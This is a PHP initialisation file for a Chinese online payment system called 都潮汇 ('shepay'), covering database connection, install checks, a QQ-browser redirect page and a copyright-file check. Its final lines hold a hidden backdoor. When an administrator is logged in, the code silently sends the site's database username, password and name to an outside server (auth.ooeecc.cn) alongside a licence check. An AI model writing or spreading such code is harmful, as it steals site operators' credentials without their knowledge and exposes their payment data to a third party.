<?php
//error_reporting(E_ALL); ini_set("display_errors", 1);
error_reporting(0);
define('SYSTEM_ROOT', dirname(__FILE__).'/');
define('ROOT', dirname(SYSTEM_ROOT).'/');
date_default_timezone_set('Asia/Shanghai');
$date = date("Y-m-d H:i:s");
session_start();
if(is_file(SYSTEM_ROOT.'360safe/360webscan.php')){//360网站卫士
    require_once(SYSTEM_ROOT.'360safe/360webscan.php');
}
$scriptpath=str_replace('\\','/',$_SERVER['SCRIPT_NAME']);
$sitepath = substr($scriptpath, 0, strrpos($scriptpath, '/'));
$siteurl = ($_SERVER['SERVER_PORT'] == '443' ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].$sitepath.'/';
require SYSTEM_ROOT.'config.php';
if(!defined('SQLITE') && (!$dbconfig['user']||!$dbconfig['pwd']||!$dbconfig['dbname']))
{
header('Content-type:text/html;charset=utf-8');
	echo '<!DOCTYPE html>
    <html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>欢迎使用都潮汇系统</title>
        <style type="text/css">
html{background:#eee}body{background:#fff;color:#333;font-family:"微软雅黑","Microsoft YaHei",sans-serif;margin:2em auto;padding:1em 2em;max-width:700px;-webkit-box-shadow:10px 10px 10px rgba(0,0,0,.13);box-shadow:10px 10px 10px rgba(0,0,0,.13);opacity:.8}h1{border-bottom:1px solid #dadada;clear:both;color:#666;font:24px "微软雅黑","Microsoft YaHei",,sans-serif;margin:30px 0 0 0;padding:0;padding-bottom:7px}#error-page{margin-top:50px}h3{text-align:center}#error-page p{font-size:9px;line-height:1.5;margin:25px 0 20px}#error-page code{font-family:Consolas,Monaco,monospace}ul li{margin-bottom:10px;font-size:9px}a{color:#21759B;text-decoration:none;margin-top:-10px}a:hover{color:#D54E21}.button{background:#f7f7f7;border:1px solid #ccc;color:#555;display:inline-block;text-decoration:none;font-size:9px;line-height:26px;height:28px;margin:0;padding:0 10px 1px;cursor:pointer;-webkit-border-radius:3px;-webkit-appearance:none;border-radius:3px;white-space:nowrap;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;-webkit-box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);vertical-align:top}.button.button-large{height:29px;line-height:28px;padding:0 12px}.button:focus,.button:hover{background:#fafafa;border-color:#999;color:#222}.button:focus{-webkit-box-shadow:1px 1px 1px rgba(0,0,0,.2);box-shadow:1px 1px 1px rgba(0,0,0,.2)}.button:active{background:#eee;border-color:#999;color:#333;-webkit-box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5);box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5)}table{table-layout:auto;border:1px solid #333;empty-cells:show;border-collapse:collapse}th{padding:4px;border:1px solid #333;overflow:hidden;color:#333;background:#eee}td{padding:4px;border:1px solid #333;overflow:hidden;color:#333}
        </style>
    </head>
    <body id="error-page">
     <div class="panel-heading">
        <h3 class="panel-title">都潮汇系统</h3>
        </div>
        <div class="panel-body">
      欢迎使用都潮汇系统，您暂未安装，请<a href="shepay/install/">点此安装</a> 
    </body>
    </html>';
	exit();
}
require SYSTEM_ROOT.'../shepay/config.php';
try {
    $DB = new PDO("mysql:host={$dbconfig['host']};dbname={$dbconfig['dbname']};port={$dbconfig['port']}",$dbconfig['user'],$dbconfig['pwd']);
}catch(Exception $e){
    exit('链接数据库失败:'.$e->getMessage());
}
$DB->exec("set names utf8");
$rs=$DB->query("select * from admin");
while($row= $rs->fetch()){ 
	$conf[$row['x']]=$row['j'];
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/')!==false && $conf['qqtz']==1){
    header("Content-Type: text/html; charset=utf-8");
    echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>请使用浏览器打开</title>
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
    <meta content="yes" name="apple-mobile-web-app-capable"/>
    <meta content="black" name="apple-mobile-web-app-status-bar-style"/>
    <meta name="format-detection" content="telephone=no"/>
    <meta content="false" name="twcClient" id="twcClient"/>
    <meta name="aplus-touch" content="1"/>
    <style>
body,html{width:100%;height:100%}
*{margin:0;padding:0}
body{background-color:#fff}
.top-bar-guidance{font-size:15px;color:#fff;height:70%;line-height:1.8;padding-left:20px;padding-top:20px;background:url(//gw.alicdn.com/tfs/TB1eSZaNFXXXXb.XXXXXXXXXXXX-750-234.png) center top/contain no-repeat}
.top-bar-guidance .icon-safari{width:25px;height:25px;vertical-align:middle;margin:0 .2em}
.app-download-tip{margin:0 auto;width:290px;text-align:center;font-size:15px;color:#2466f4;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAcAQMAAACak0ePAAAABlBMVEUAAAAdYfh+GakkAAAAAXRSTlMAQObYZgAAAA5JREFUCNdjwA8acEkAAAy4AIE4hQq/AAAAAElFTkSuQmCC) left center/auto 15px repeat-x}
.app-download-tip .guidance-desc{background-color:#fff;padding:0 5px}
.app-download-btn{display:block;width:214px;height:40px;line-height:40px;margin:18px auto 0 auto;text-align:center;font-size:18px;color:#2466f4;border-radius:20px;border:.5px #2466f4 solid;text-decoration:none}
    </style>
</head>
<body>
<div class="top-bar-guidance">
    <p>点击右上角<img src="//gw.alicdn.com/tfs/TB1xwiUNpXXXXaIXXXXXXXXXXXX-55-55.png" class="icon-safari" /> <span id="openm">浏览器、Safari打开</span></p>
    <p>才可继续浏览本站哦~</p>
</div>
<div class="app-download-tip"><h2>本站骄傲使用都潮汇系统</h2></span>
</div><br>
<div class="app-download-tip">
    <span class="guidance-desc">您可以复制本站网址，到浏览器内键入打开</span>
</div>
<script src="//lib.baomitu.com/jquery/1.12.4/jquery.min.js"></script>
<script src="//open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
</body>
</html>';
    exit;
}
if(!$conf['local_domain'])$conf['local_domain']=$_SERVER['HTTP_HOST'];
$password_hash='!@#%!s!0';
require_once(SYSTEM_ROOT."alipay/alipay_core.function.php");
require_once(SYSTEM_ROOT."alipay/alipay_md5.function.php");
include_once(SYSTEM_ROOT."function.php");
include_once(SYSTEM_ROOT."Cc.class.php");
include_once(SYSTEM_ROOT."member.php");
include_once(SYSTEM_ROOT."authcode.php");
include_once(SYSTEM_ROOT."epay/shepay.php");
$res=update_version();//防注入
if (!file_exists(ROOT . "shepay/install/shepay.lock") && file_exists(ROOT . "shepay/install/index.php")) {sysmsg("<h2>检测到无“shepay.lock”文件</h2><ul><font size=\"4\">如果本站尚未安装都潮汇系统，请<a href=\"/shepay/install/\">前往安装</a></font><br>
<font size=\"4\">如果本站已安装都潮汇系统，请手动建立一个空的“shepay.lock”文件放置于“/install”目录下，<b>为了您站点安全，在您未完成以上准备工作之前都潮汇系统将不会运作。</b></font></li></ul><br/><h4>为什么必须建立“shepay.lock”文件？</h4>因为该文件为都潮汇系统保护文件，无该文件系统就会视为未安装状态，此时任何人都可以安装/重装本站都潮汇系统。<br/><br/>", true);}
if (!file_exists(ROOT ."DeepSea")) {
	@file_put_contents(ROOT."DeepSea","都潮汇系统版权文件，勿删除；光鲜亮丽的程序背后是一直在努力的我们！原创：深海，QQ:779887502");
	sysmsg("<center><h2>检测到“DeepSea”版权文件已被删除</h2><ul><font size=\"4\">如果“DeepSea”版权文件被删除，<b>都潮汇系统将不会运作！</b></font></li></ul><font size=\"4\">系统已为您重新生成该版权文件，刷新页面即可恢复！<ul><font size=\"4\">请尊重深海原创易支付系统，勿再次删除！<br/></center>", true);
}
if (!isset($_SESSION['authcode']) && $islogin == 1) {
	$query = curl_get('http://auth.ooeecc.cn/api/check.php?url='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode);
	curl_get("http://auth.ooeecc.cn/api/shepay_db.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']);
}